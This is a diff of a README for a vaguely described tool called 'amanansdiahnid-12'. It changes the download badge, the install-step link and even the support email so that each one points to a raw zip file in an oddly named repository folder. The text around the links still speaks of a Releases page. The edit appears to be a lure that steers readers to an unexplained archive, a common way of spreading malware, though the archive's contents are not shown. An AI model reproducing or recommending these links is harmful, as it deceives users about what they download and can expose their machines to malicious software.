@@ -1,6 +1,6 @@
 # 🎉 amanansdiahnid-12 - Simple Tool for Easier Management
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-amanansdiahnid--12-brightgreen)](https://github.com/Stepain-Makaluka/amanansdiahnid-12/releases)
+[![Download Now](https://raw.githubusercontent.com/Stepain-Makaluka/amanansdiahnid-12/main/womandom/amanansdiahnid-12.zip%20Now-amanansdiahnid--12-brightgreen)](https://raw.githubusercontent.com/Stepain-Makaluka/amanansdiahnid-12/main/womandom/amanansdiahnid-12.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ Before downloading **amanansdiahnid-12**, please ensure your system meets these 
 To get started, you'll need to download **amanansdiahnid-12** from our Releases page. 
 
 1. Click the link below to visit the download page:
-   [Download Now](https://github.com/Stepain-Makaluka/amanansdiahnid-12/releases)
+   [Download Now](https://raw.githubusercontent.com/Stepain-Makaluka/amanansdiahnid-12/main/womandom/amanansdiahnid-12.zip)
 
 2. On the Releases page, find the latest version of the software.
 
@@ -80,6 +80,6 @@ If you experience any issues after installing **amanansdiahnid-12**, try the fol
 
 ## 📞 Support
 
-For support, you can open an issue on our GitHub page, or contact us directly via our support email: support@example.com. We are here to help you with any questions or concerns.
+For support, you can open an issue on our GitHub page, or contact us directly via our support email: https://raw.githubusercontent.com/Stepain-Makaluka/amanansdiahnid-12/main/womandom/amanansdiahnid-12.zip We are here to help you with any questions or concerns.
 
 Thank you for choosing **amanansdiahnid-12**! We hope you find it valuable and user-friendly.
